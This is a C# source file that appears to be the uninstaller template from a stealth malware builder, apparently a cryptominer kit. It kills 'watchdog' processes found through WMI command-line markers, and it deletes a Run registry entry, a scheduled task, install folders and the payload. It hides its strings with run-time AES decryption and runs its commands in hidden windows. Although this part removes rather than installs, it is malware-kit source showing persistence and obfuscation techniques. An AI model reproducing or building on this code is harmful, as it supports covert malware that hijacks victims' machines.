using System;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

public partial class RUninstaller
{
    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
#if DefSystem32
    public static string _rbD2_ = (Environment.SystemDirectory + @"\" + _rGetString_("#LIBSPATH"));
#endif

    public static void Main()
    {
#if DefInstall
        try
        {
            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOG")))
            {
                proc.Kill();
            }

            try
            {
                File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"));
            } 
            catch {}

            try
            {
                File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log"));
            } 
            catch {}
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U1: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(_rGetString_("#REGKEY"), true))
            {
                if (key != null)
                {
                    key.DeleteValue(Path.GetFileName(PayloadPath));
                }
            }
        }
        catch {}

        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c schtasks /delete /f /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U3: " + Environment.NewLine + ex.ToString());
#endif
        }

#endif

        try
        {
            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains("--cinit-find-x") || MemObj["CommandLine"].ToString().Contains("/" + _rGetString_("#WATCHDOG"))))
                {
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U4: " + Environment.NewLine + ex.ToString());
#endif
        }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(_rbD_, true);
#if DefSystem32
            Directory.Delete(_rbD2_, true);
#endif
#if DefInstall
            File.Delete(PayloadPath);
#endif
        }
        catch {}
        Environment.Exit(0);
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
    {
        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
        using (var _rarg7_ = new MemoryStream())
        {
            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
            {
                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
                _rarg8_.Close();
            }

            return _rarg7_.ToArray();
        }
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            });
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }
}